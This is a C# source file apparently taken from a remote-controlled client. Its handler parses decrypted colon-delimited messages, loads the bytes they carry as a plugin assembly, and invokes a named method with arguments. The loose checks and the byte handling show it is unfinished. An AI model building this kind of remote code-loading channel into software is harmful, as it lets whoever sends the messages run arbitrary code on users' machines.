using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClientNet.Tools
{
    class CustomHandler
    {
        private AssReslve ass = new AssReslve();
        public void ProccessRequest(string decryptData)
        {
            // For loading plugins
            // function_enum(custom):byte_data:class_name:method/function_name:arguments_if_present
            // 0 - should be custom :    1     :    2    :          3         :           4
            string[] args = decryptData.Split(':');
            if (CheckValid(args[0]))
            {
                byte[] rawDog = Encoding.ASCII.GetBytes(args[1]);
                // TODO: remove the byte[] initializtion and just use the encoding segment for LoadPlugin()
                if (LoadPlugin(rawDog))
                {
                    if (LoadClass(args[2],args[3]))
                    {
                        if (args[4] != null) // parameters to pass along present
                        {
                            if (ClassTime(args[3], args[4]))
                            {
                                Console.WriteLine("Plugin loaded and ran!");
                            }
                            else
                            {
                                Console.WriteLine("Plugin NOT loaded and ran!");
                            }
                        }
                        else
                        {
                            if (ClassTime(args[3], "1"))
                            {
                                Console.WriteLine("Plugin loaded and ran!");
                            }
                            else
                            {
                                Console.WriteLine("Plugin NOT loaded and ran!");
                            }
                        }
                    }
                } 
            }
        }


        private bool CheckValid(string function)
        {
            if (function.Contains("custom")) // change to function == "custom" after everything working
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private bool LoadPlugin(byte[] plainBytes)
        {
            if (ass.LoadPlugin(plainBytes))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private bool LoadClass(string _class,string function)
        {
            if (ass.LoadClass(_class, function))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private bool ClassTime(string function,string args)
        {
            if (ass.FireFunctions(function, args))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
